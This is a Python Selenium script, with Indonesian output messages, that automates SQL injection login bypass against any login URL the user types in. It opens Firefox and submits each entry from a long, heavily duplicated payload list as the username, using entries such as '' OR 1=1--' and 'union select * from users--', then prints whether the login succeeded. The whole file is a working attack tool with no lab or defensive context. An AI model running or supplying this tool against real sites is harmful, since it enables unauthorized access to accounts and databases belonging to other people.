from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def open_browser_and_login(url, data):
    firefox_path = r'C:\Program Files\Mozilla Firefox\firefox.exe'
    firefox_options = webdriver.FirefoxOptions()
    firefox_options.binary_location = firefox_path
    driver = webdriver.Firefox(options=firefox_options)
    driver.get(url)

    username_field = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, 'username'))
    )
    password_field = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, 'password'))
    )
    username_field.send_keys(data['username'])
    password_field.send_keys(data['password'])

    password_field.submit()

    try:
        dashboard_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, 'container'))
        )
        print("Login Berhasil!")
    except:
        print("Login Gagal")

    driver.quit()

def generate_payloads():
    payloads = [
        "' OR 1=1--",
        "' OR 1=1-- -",
        "' OR 1=1#",
        "' OR '1'='1'--",
        "' OR '1'='1'-- -",
        "' OR '1'='1'#",
        "' OR '1'='1--",
        "' OR '1'='1-- -",
        "' OR '1'='1'#",
        "\" OR 1=1--",
        "\" OR 1=1-- -",
        "\" OR 1=1#",
        "') OR 1=1--",
        "') OR 1=1-- -",
        "') OR 1=1#",
        "'; OR 1=1--",
        "'; OR 1=1-- -",
        "'; OR 1=1#",
        "admin or 1=1--",
        "admin or 1=1-- -",
        "admin or 1=1#",
        "' OR 'x'='x",
        "\" OR \"x\"=\"x",
        "') OR ('x'='x",
        "\")) OR (('x\"=\"x",
        "')) OR ((\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or '1'='1",
        "\" or \"1\"=\"1",
        "') or ('1'='1",
        "\") or (\"1\"=\"1",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' or username like '%",
        "\" or username like '%",
        "') or username like '%",
        "\") or username like '%",
        "' or 'x'='x",
        "\" or \"x\"=\"x",
        "') or ('x'='x",
        "\") or (\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--","' OR 'x'='x",
        "\" OR \"x\"=\"x",
        "') OR ('x'='x",
        "\")) OR (('x\"=\"x",
        "')) OR ((\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' or username like '%",
        "\" or username like '%",
        "') or username like '%",
        "\") or username like '%",
        "' or 'x'='x",
        "\" or \"x\"=\"x",
        "') or ('x'='x",
        "\") or (\"x\"=\"x",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' union select null--",
        "\" union select null--",
        "') union select null--",
        "\") union select null--",
        "' union select * from users--",
        "\" union select * from users--",
        "') union select * from users--",
        "\") union select * from users--",
        "' or 1=1--",
        "\" or 1=1--",
        "') or 1=1--",
        "\") or 1=1--",
        "' or a=a--",
        "\" or a=a--",
        "') or a=a--",
        "\") or a=a--",
        "' union select null--",
        "\" union select null--",
        "') union select null--",
        "\") union select null--",
        "' union select * from users--",
        "\" union select * from users--",
        "') union select * from users--",
        "\") union select * from users--"
    ]
    return payloads

def execute_payloads(target_url, payloads):
    for payload in payloads:
        data = {
            'username': payload,
            'password': 'password'
        }
        open_browser_and_login(target_url, data)
        print(f"Payload: {payload}")

target_login_url = input("Masukkan URL login target: ")
payload_list = generate_payloads()
execute_payloads(target_login_url, payload_list)
